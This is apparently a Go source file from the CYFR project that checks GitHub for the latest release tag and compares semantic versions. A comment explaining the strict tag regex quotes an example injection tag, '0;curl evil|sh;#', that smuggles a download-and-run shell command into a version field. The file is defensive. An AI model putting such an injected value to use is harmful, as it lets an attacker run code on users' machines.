package release

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

// bareSemver is the only shape a release tag may take: MAJOR.MINOR.PATCH
// with no prefix, which also skips the legacy `v*` and `porta-v*` tags.
// `cyfr upgrade` interpolates this string into a shell command line, so
// "starts with a digit" was not a strong enough filter — a tag like
// `0;curl evil|sh;#` passed it.
var bareSemver = regexp.MustCompile(`^\d+\.\d+\.\d+$`)

// apiURL is the GitHub releases endpoint for the CYFR repo. It is a package
// variable so tests can point it at an httptest server.
var apiURL = "https://api.github.com/repos/cyfrworks/cyfr/releases?per_page=20"

// Latest returns the newest published CYFR release as a bare semver string
// (e.g. "0.5.4"). It selects the first tag that starts with a digit, so legacy
// "v*" releases and "porta-v*" desktop releases are skipped.
func Latest(ctx context.Context) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, apiURL, nil)
	if err != nil {
		return "", err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GitHub API returned status %d", resp.StatusCode)
	}

	var releases []struct {
		TagName string `json:"tag_name"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&releases); err != nil {
		return "", err
	}

	for _, r := range releases {
		if bareSemver.MatchString(r.TagName) {
			return r.TagName, nil
		}
	}
	return "", fmt.Errorf("no CYFR release found")
}

// IsNewer reports whether latest is a strictly greater bare MAJOR.MINOR.PATCH
// version than current. If either side is not a clean three-part numeric
// version (for example a "dev" build), it returns false so unreleased or local
// builds never trigger an upgrade notice.
func IsNewer(latest, current string) bool {
	lv, ok := parse(latest)
	if !ok {
		return false
	}
	cv, ok := parse(current)
	if !ok {
		return false
	}
	for i := 0; i < 3; i++ {
		if lv[i] != cv[i] {
			return lv[i] > cv[i]
		}
	}
	return false
}

// parse converts a bare "MAJOR.MINOR.PATCH" string into its numeric parts,
// ignoring any leading "v" and any pre-release/build suffix. It reports false
// if the version is not three numeric components.
func parse(v string) ([3]int, bool) {
	v = strings.TrimPrefix(v, "v")
	if i := strings.IndexAny(v, "-+"); i >= 0 {
		v = v[:i]
	}
	parts := strings.Split(v, ".")
	if len(parts) != 3 {
		return [3]int{}, false
	}
	var out [3]int
	for i, p := range parts {
		n, err := strconv.Atoi(p)
		if err != nil || n < 0 {
			return [3]int{}, false
		}
		out[i] = n
	}
	return out, true
}
